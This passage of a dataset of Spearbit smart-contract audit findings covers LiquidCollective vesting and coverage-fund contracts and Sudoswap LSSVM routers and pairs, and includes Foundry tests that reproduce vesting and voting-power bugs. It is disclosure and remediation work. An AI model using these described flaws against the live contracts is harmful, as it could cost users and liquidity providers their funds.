River.setMetadataURI and MetadataURI.set both allow the current value of the metadata URI to be updated to an empty string.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider requiring that the _cliffDuration is a multiple of _period", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "When a vesting schedule is created via _createVestingSchedule, the only check made on _period parameter (other than being greater than zero) is that the _duration must be a multiple of _period. If after the _cliffDuration the user can already release the matured vested tokens, it could make sense to also require that _cliffDuration % _period == 0", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Add documentation about the scenario where a vesting schedule can be created in the past", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "In the current implementation of ERC20VestableVotesUpgradeable _createVestingSchedule func- tion, there is no check for the _start value. This means that the creator of a vesting schedule could create a schedule that starts in the past. Allowing the creation of a vesting schedule with a past _start also influences the behavior of _revokeVestingSchedule (see ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked).", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The current implementation of _createVestingSchedule allows the creation of vesting schedules that  Start in the past: _start < block.timestamp.  Have already ended: _start + _duration < block.timestamp. Because of this behavior, in case of the creation of a past vesting schedule that has already ended  The _beneficiary can instantly call (if there's no lock period) releaseVestingSchedule to release the whole amount of tokens.  The creator of the vesting schedule cannot call revokeVestingSchedule because the new end would be in the past and the transaction would revert with an InvalidRevokedVestingScheduleEnd error. The second scenario is particularly important because it does not allow the creator to reduce the length or remove the schedule entirely in case the schedule has been created mistakenly or with a misconfiguration (too many token vested, lock period too long, etc...).", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "getVestingSchedule returns misleading information if the vesting token creator revokes the sched- ule", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The getVestingSchedule function returns the information about the created vesting schedule. The duration represents the number of seconds of the vesting period and the amount represents the number of tokens that have been scheduled to be released after the period end (or after lockDuration if it has been configured to be greater than end). If the creator of the vesting schedule calls revokeVestingSchedule, only the end of the vesting schedule struct will be updated. If external contracts or dApps rely only on the getVestingSchedule information there could be scenarios where they display or base their logic on wrong information. Consider the following example. Alluvial creates a vesting schedule for alice with the following config 18 { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true This means that after 10 days, Alice would own in her balance 10 TLC tokens. If Alluvial calls revokeVestingSchedule before the cliff period ends, all of the tokens will be returned to Alluvial but the getVestingSchedule function would still display the same information with just the end attribute updated. An external dApp or contract that does not check the new end and compares it to cliffDuration, lockDura- tion, and period but only uses the amount would display the wrong number of vested tokens for Alice at a given timestamp.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule. This function returns the value returned by _computeVestedAmount that relies on duration and amount while the only attribute changed by revokeVestingSchedule is the end. 19 function _computeVestedAmount(VestingSchedules.VestingSchedule memory _vestingSchedule, uint256 _time) internal pure returns (uint256) { if (_time < _vestingSchedule.start + _vestingSchedule.cliffDuration) { // pre-cliff no tokens have been vested return 0; } else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) { // post vesting all tokens have been vested return _vestingSchedule.amount; } else { uint256 timeFromStart = _time - _vestingSchedule.start; // compute tokens vested for completly elapsed periods uint256 vestedDuration = timeFromStart - (timeFromStart % _vestingSchedule.period); return (vestedDuration * _vestingSchedule.amount) / _vestingSchedule.duration; } } If the creator revokes the schedule, the computeVestingVestedAmount would return more tokens compared to the amount that the user has vested in reality. Consider the following example. Alluvial creates a vesting schedule with the following config { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true Alluvial then calls revokeVestingSchedule(0, uint64(block.timestamp + 5 days));. The effect of this trans- action would return 5 tokens to Alluvial and set the new end to block.timestamp + 5 days. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + 7 days), it would return 7 because _computeVestedAmount would execute the code in the else branch. But alice cannot have more than 5 vested tokens because of the previous revoke. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + duration)it would return 10 because _computeVestedAmount would execute the code in the else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) branch. But alice cannot have more than 5 vested tokens because of the previous revoke. Attached test below to reproduce it: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { 20 function __computeVestingReleasableAmount(uint256 vestingID, uint256 _time) external view returns (uint256) { ,! return _computeVestingReleasableAmount( VestingSchedules.get(vestingID), _deterministicVestingEscrow(vestingID), _time ); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal creator; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); creator = makeAddr(\"creator\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testIncorrectComputeVestingVestedAmount() public { vm.prank(initAccount); tlc.transfer(creator, 10); // create a vesting schedule for Alice vm.prank(creator); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); // creator call revokeVestingSchedule revoking the vested schedule setting the new end as half ,! of the duration // 5 tokens are returned to the creator and `end` is updated to the new value // this means also that at max alice will have 5 token vested (and releasable) vm.prank(creator); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 5 days)); // We warp at day 7 of the schedule vm.warp(block.timestamp + 7 days); 21 // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 7); // We warp at day 10 (we reached the total duration of the vesting) vm.warp(block.timestamp + 3 days); // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 10); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider writing clear documentation on how the voting power and delegation works", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "ERC20VotesUpgradeable contract. As the official OpenZeppelin documentation says (also reported in the Alluvial's natspec contract): ERC20VestableVotesUpgradeableV1 extension The an of is By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked. Because of how ERC20VotesUpgradeable behaves on voting power and delegation of voting power could be coun- terintuitive for normal users who are not aware of it, Alluvial should be very explicit on how users should act when a vesting schedule is created for them. When a Vote Token is transferred, ERC20VotesUpgradeable calls the hook _afterTokenTransfer function _afterTokenTransfer( address from, address to, uint256 amount ) internal virtual override { super._afterTokenTransfer(from, to, amount); _moveVotingPower(delegates(from), delegates(to), amount); } In this case, _moveVotingPower(delegates(from), delegates(to), amount); will decrease the voting power of delegates(from) by amount and will increase the voting power of delegates(to) by amount. This applies if some conditions are true, but you can see them here function _moveVotingPower( address src, address dst, uint256 amount ) private { if (src != dst && amount > 0) { if (src != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[src], _subtract, ,! amount); emit DelegateVotesChanged(src, oldWeight, newWeight); } if (dst != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[dst], _add, amount); emit DelegateVotesChanged(dst, oldWeight, newWeight); } } } When a vesting schedule is created, the creator has two options: 1) Specify a custom delegatee different from the beneficiary (or equal to it, but it's the same as option 2). 2) Leave the delegatee empty (equal to address(0)).  Scenario 1) empty delegatee OR delegatee === beneficiary (same thing) After creating the vesting schedule, the voting power of the beneficiary will be equal to the amount of tokens vested. If the beneficiary did not call tlc.delegate(beneficiary) previously, after releasing some tokens, its voting power will be decreased by the amount of released tokens. 23  Scenario 2) delegatee !== beneficiary && delegatee !== address(0) Same thing as before, but now we have two different actors, one is the beneficiary and another one is the delegatee of the voting power of the vested tokens. If the beneficiary did not call tlc.delegate(vestingScheduleDelegatee) previously, after releasing some to- kens, the voting power of the current vested schedule's delegatee will be decreased by the amount of released tokens.  Related test for scenario 1 //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testLosingPowerAfterRelease() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: false }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); assertEq(tlc.getVotes(alice), 10); 24 assertEq(tlc.balanceOf(alice), 0); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); tlc.releaseVestingSchedule(0); // Alice now owns the vested tokens just released but her voting power has decreased by the ,! amount released assertEq(tlc.getVotes(alice), 9); assertEq(tlc.balanceOf(alice), 1); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Fix mismatch between revert error message and code behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The error message requires the schedule duration to be greater than the cliff duration, but the code allows it to be greater than or equal to the cliff duration.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Improve documentation and naming of period variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Similar to Consider renaming period to periodDuration to be more descriptive, the variable name and documentation are ambiguous. We can give a more descriptive name to the variable and fix the documenta- tion.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider renaming period to periodDuration to be more descriptive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "period can be confused as (for example) a counter or an id.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider removing coverageFunds variable and explicitly initialize executionLayerFees to zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Inside the OracleManager.setConsensusLayerData the coverageFunds variable is declared but never used. Consider cleaning the code by removing the unused variable. The executionLayerFees variable instead should be explicitly initialized to zero to not rely on compiler assump- tions.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider renaming IVestingScheduleManagerV1 interface to IERC20VestableVotesUpgradeableV1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The IVestingScheduleManager interface contains all ERC20VestableVotesUpgradeableV1 needs to implement and use. the events, errors, and functions that Because there's no corresponding VestingScheduleManager contract implementation, it would make sense to rename the interface to IERC20VestableVotesUpgradeableV1.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider renaming CoverageFundAddress COVERAGE_FUND_ADDRESS to be consistent with the current naming convention", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Consider renaming the constant used to access the unstructured storage slot COVERAGE_FUND_- ADDRESS. To follow the naming convention already adopted across all the contracts, the variable should be renamed to COVERAGE_FUND_ADDRESS_SLOT.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider reverting if the msg.value is zero in CoverageFundV1.donate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "In the current implementation of CoverageFundV1.donate there is no check on the msg.value value. Because of this, the sender can \"spam\" the function and emit multiple useless Donate events.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider having a separate function in River contract that allows CoverageFundV1 to send funds instead of using the same function used by ELFeeRecipientV1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "When the River contract calls the CoverageFundV1 contract to pull funds, the CoverageFundV1 sends funds to River by calling IRiverV1(payable(river)).sendELFees{value: amount}();. sendELFees is a function that is currently used by both CoverageFundV1 and ELFeeRecipientV1. function sendELFees() external payable { if (msg.sender != ELFeeRecipientAddress.get() && msg.sender != CoverageFundAddress.get()) { revert LibErrors.Unauthorized(msg.sender); } } It would be cleaner to have a separate function callable only by the CoverageFundV1 contract.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Extensively document how the Coverage Funds contract works", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The Coverage Fund contract has a crucial role inside the Protocol, and the current contract's docu- mentation does not properly cover all the needed aspects. Consider documenting the following aspects:  General explanation of the Coverage Funds and it's purpose.  Will donations happen only after a slash/penalty event? Or is there a \"budget\" that will be dumped on the contract regardless of any slashing events?  If a donation of XXX ETH is made, how is it handled? In a single transaction or distributed over a period of time?  Explain carefully that when ETH is donated, no shares are minted.  Explain all the possible market repercussions of the integration of Coverage Funds.  Is there any off-chain validation process before donating? 29  Who are the entities that are enabled to donate to the fund?  How is the Coverage Funds integrated inside the current Alluvial protocol?  Any additional information useful for the users, investors, and other actors that interact with the protocol.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Missing/wrong natspec comment and typos", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": " Natspec  Missing part of the natspec comment for /// @notice Attempt to revoke at a relative to InvalidRevokedVestingScheduleEnd in IVestingScheduleManager  Natspec missing the @return part for getVestingSchedule in IVestingScheduleManager.  Wrong order of natspec @param for createVestingSchedule in IVestingScheduleManager. The @param _beneficiary should be placed before @param _delegatee to follow the function signature order.  Natspec missing the @return part for delegateVestingEscrow in IVestingScheduleManager.  Wrong natspec comment, operators should be replaced with vesting schedules for @custom:attribute of struct SlotVestingSchedule in VestingSchedules. 30  Wrong natspec parameter, replace operator with vesting schedule in the VestingSchedules.push func- tion.  Missing @return natspec for _delegateVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _deterministicVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _getCurrentTime in ERC20VestableVotesUpgradeable.  Add the Coverage Funds as a source of \"extra funds\" in the Oracle._pushToRiver natspec documentation in Oracle.  Update the InvalidCall natspec in ICoverageFundV1 given that the error is thrown also in the receive() external payable function of CoverageFundV1.  Update the natspec of struct VestingSchedule lockDuration attribute in VestingSchedules by explaining that the lock duration of a vesting schedule could possibly exceed the overall duration of the vesting.  Update the natspec of lockDuration in ERC20VestableVotesUpgradeable by explaining that the lock dura- tion of a vesting schedule could possibly exceed the overall duration of the vesting.  Consider making the natspec documentation of struct VestingSchedule in VestingSchedules and the natspec in ERC20VestableVotesUpgradeable be in sync.  Add more examples (variations) to the natspec documentation of the vesting schedules example in ERC20VestableVotesUpgradeable to explain all the possible combination of scenarios.  Make the ERC20VestableVotesUpgradeable natspec documentation about the vesting schedule consis- tent with the natspec documentation of _createVestingSchedule and VestingSchedules struct Vest- ingSchedule.  Typos  Replace all Overriden instances with Overridden in River.  Replace transfer with transfers in ERC20VestableVotesUpgradeable.1.sol#L147.  Replace token with tokens in ERC20VestableVotesUpgradeable.1.sol#L156.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Different behavior between River _pullELFees and _pullCoverageFunds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Both _pullELFees and _pullCoverageFunds implement the same functionality:  Pull funds from a contract address.  Update the balance storage variable.  Emit an event.  Return the amount of balance collected from the contract. The _pullCoverageFunds differs from the _pullELFees implementation by avoiding both updating the Balance- ToDeposit when collectedCoverageFunds == 0 and emitting the PulledCoverageFunds event. Because they are implementing the same functionality, they should follow the same behavior if there is not an explicit reason to not do so. 31", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Move local mask variable from Allowlist.1.sol to LibAllowlistMasks.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "LibAllowlistMasks.sol is meant to contain all mask values, but DENY_MASK is a local variable in the Allowlist.1.sol contract.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider adding additional parameters to the existing events to improve filtering/monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Some already defined events could be improved by adding more parameters to better track those events in dApps or monitoring tools.  Consider adding address indexed delegatee as an event's parameter to event CreatedVestingSchedule. While it's true that after the vest/lock period the beneficiary will be the owner of those tokens, in the meanwhile (if _delegatee != address(0)) the voting power of all those vested tokens are delegated to the _delegatee.  Consider adding address indexed beneficiary to event ReleasedVestingSchedule.  Consider adding uint256 newEnd to event RevokedVestingSchedule to track the updated end of the vesting schedule.  Consider adding address indexed beneficiary to event DelegatedVestingEscrow. If those events parameters are added to the events, the Alluvial team should also remember to update the relative natspec documentation.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Missing indexed keyword in events parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Some events parameters are missing the indexed keyword. Indexing specific parameters is partic- ularly important to later be able to filter those events both in dApps or monitoring tools.  coverageFund event parameter should be declared as indexed in event SetCoverageFund.  Both oldDelegatee and newDelegatee should be indexed in event DelegatedVestingEscrow.  donator should be declared as indexed in event Donate.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Add natspec documentation to the TLC contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The current implementation of TLC contract is missing natspec at the root level to explain the contract. The natspec should cover the basic explanation of the contract (like it has already been done in other contracts like River.sol) but also illustrate  TLC token has a fixed max supply that is minted at deploy time.  All the minted tokens are sent to a single account at deploy time.  How TLC token will be distributed.  How voting power works (you have to delegate to yourself to gain voting power).  How the vesting process works.  Other general information useful for the user/investor that receives the TLC token directly or vested.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Partial fills for buy orders in ERC1155 swaps will fail when pair has insufficient balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Partial fills are currently supported for buy orders in VeryFastRouter.swap(). When _findMaxFil- lableAmtForBuy() determines numItemsToFill, it is not guaranteed that the underlying pair has so many items left to fill. While ERC721 swap handles the scenario where pair balance is less than numItemsToFill in the logic of _findAvailableIds() (maxIdsNeeded vs numIdsFound), ERC1155 swap is missing a similar check and reduction of item numbers when required. Partial fills for buy orders in ERC1155 swaps will fail when the pair has a balance less than numItemsToFill as determined by _findMaxFillableAmtForBuy(). Partial filling, a key feature of VeryFastRouter, will then not work as expected and would lead to an early revert which defeats the purpose of swap().", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Function token() of cloneERC1155ERC20Pair() reads from wrong location", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function token() loads the token data from position 81. However on ERC1155 pairs it should load it from position 93. Currently, it doesn't retrieve the right values and the code won't function correctly. LSSVMPair.sol: LSSVMPair.sol: 20))) ,! LSSVMPair.sol: 40))) ,! LSSVMPair.sol: 60))) _factory _bondingCurve := shr(0x60, calldataload(sub(calldatasize(), paramsLength))) := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _nft := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _poolType := shr(0xf8, calldataload(add(sub(calldatasize(), paramsLength), ,! LSSVMPairERC1155.sol: id LSSVMPairERC721.sol: _propertyChecker := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), := calldataload(add(sub(calldatasize(), paramsLength), 61)) 61))) ,! LSSVMPairERC20.sol: ,! 81))) _token := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), function cloneERC1155ERC20Pair(... ) ... { assembly { ... mstore(add(ptr, 0x3e), shl(0x60, factory)) - 20 bytes mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) // position 20 - 20 bytes // position 40 - 20 bytes mstore(add(ptr, 0x66), shl(0x60, nft)) // position 60 - 1 bytes mstore8(add(ptr, 0x7a), poolType) // position 61 - 32 bytes mstore(add(ptr, 0x7b), nftId) mstore(add(ptr, 0x9b), shl(0x60, token)) // position 93 - 20 bytes ... // position 0 } } 6", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Switched order of update leads to incorrect partial fill calculations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In the binary search, the order of updation of start and numItemsToFill is switched with start being updated before numItemsToFill which itself uses the value of start: start = (start + end)/2 + 1; numItemsToFill = (start + end)/2; This leads to incorrect partial fill calculations when binary search recurses on the right half.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Swap functions with sell orders in LSSVMRouter will fail for property-check enforced pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Swap functions with sell orders in LSSVMRouter will revert for property-check enforced pairs. While VeryFastRouter swap function supports sell orders to specify property check parameters for pairs enforcing them, none of the swap functions in LSSVMRouter support the same.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "pairTransferERC20From() only supports ERC721 NFTs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Function pairTransferERC20From() which is is present in both LSSVMRouter and VeryFastRouter, only checks for ERC721_ERC20. This means ERC1155 NFTs are not supported by the routers. The following code is present in both LSSVMRouter and VeryFastRouter. function pairTransferERC20From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... require(variant == ILSSVMPairFactoryLike.PairVariant.ERC721_ERC20, \"Not ERC20 pair\"); ... } 7", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Insufficient application of trading fee leads to 50% loss for LPs in swapTokenForAnyNFTs()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The protocol applies a trading fee of 2*tradeFee on NFT buys from pairs (to compensate for 0 fees on NFT sells as noted in the comment: \"// We pull twice the trade fee on buys but don't take trade fee on sells if assetRecipient is set\"). this While ERC1155.swapTokenForSpecificNFTs(), trading fee of only tradeFee (instead of 2*tradeFee). enforced in is LSSVMPairERC721.swapTokenForSpecificNFTs() LSSVMPairERC1155.swapTokenForAnyNFTs() and LSSVMPair- a enforces Affected LPs of pairs targeted by LSSVMPairERC1155. swapTokenForAnyNFTs() will unexpectedly lose 50% of the trade fees.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Royalty not always being taken into account leads to incorrect protocol accounting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function getSellNFTQuoteWithRoyalties() is similar to getSellNFTQuote(), except that it also takes the royalties into account. When the function robustSwapNFTsForToken() of the LSSVMRouter is called, it first calls getSellNFTQuote() and checks that a sufficient amount of tokens will be received. Then it calls swapNFTs- ForToken() with 0 as minExpectedTokenOutput; so it will accept any amount of tokens. The swapNFTsForToken() does subtract the Royalties which will result in a lower amount of tokens received and might not be enough to satisfy the requirements of the seller. The same happens in  robustSwapETHForSpecificNFTsAndNFTsToToken and  robustSwapERC20ForSpecificNFTsAndNFTsToToken. Note: Function getSellNFTQuote() of StandardSettings.sol also uses getSellNFTQuote(). However there it is compared to the results of getBuyInfo(); so this is ok as both don't take the royalties into account. Note: getNFTQuoteForSellOrderWithPartialFill() also has to take royalties into account. 8 function getSellNFTQuote(uint256 numNFTs) ... { ( (...., outputAmount, ) = bondingCurve().getSellInfo(...); } function getSellNFTQuoteWithRoyalties(uint256 assetId, uint256 numNFTs) ... { (..., outputAmount, ... ) = bondingCurve().getSellInfo(...); (,, uint256 royaltyTotal) = _calculateRoyaltiesView(assetId, outputAmount); ... outputAmount -= royaltyTotal; } function robustSwapNFTsForToken(...) ... { ... (error,,, pairOutput,) = swapList[i].swapInfo.pair.getSellNFTQuote(swapList[i].swapInfo.nftIds.length); ... if (pairOutput >= swapList[i].minOutput) { ....swapNFTsForToken(..., 0, ...); } ... ,! } function swapNFTsForToken(...) ... { ... (protocolFee, outputAmount) = _calculateSellInfoAndUpdatePoolParams(numNFTs[0], _bondingCurve, _factory); (... royaltyTotal) = _calculateRoyalties(nftId(), outputAmount); ... outputAmount -= royaltyTotal; ... _sendTokenOutput(tokenRecipient, outputAmount); ,! }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Error return codes of getBuyInfo() and getSellInfo() are sometimes ignored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions getBuyInfo() and getSellInfo() return an error code when they detect an error. The rest of the returned parameters then have an unusable/invalid value (0). However, some callers of these functions ignore the error code and continue processing with the other unusable/invalid values. The functions getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuoteWithRoyalties() pass through the error code, so their callers have to check the error codes too. 9 function getBuyInfo(...) ... returns (CurveErrorCodes.Error error, ... ) { } function getSellInfo(...) ... returns (CurveErrorCodes.Error error, ... ) { } function getBuyNFTQuote(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getBuyInfo(...); } function getSellNFTQuote(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getSellInfo(...); } function getSellNFTQuoteWithRoyalties(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getSellInfo(...); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "changeSpotPriceAndDelta() only uses ERC721 version of balanceOf()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function changeSpotPriceAndDelta() uses balanceOf() with one parameter. This is the ERC721 variant. In order to support ERC1155, a second parameter of the NFT id has to be supplied. function changeSpotPriceAndDelta(address pairAddress, ...) public { ... if ((newPriceToBuyFromPair < priceToBuyFromPair) && pair.nft().balanceOf(pairAddress) >= 1) { ... } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "_pullTokenInputAndPayProtocolFee() doesn't check that tokens are received", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function _pullTokenInputAndPayProtocolFee() doesn't verify that it actually received the to- kens after doing safeTransferFrom(). This can be an issue with fee on transfer tokens. This is also an issue with (accidentally) non-existing tokens, as safeTransferFrom() won't revert on that, see POC below. Note: also see issue \"Malicious router mitigation may break for deflationary tokens\". function 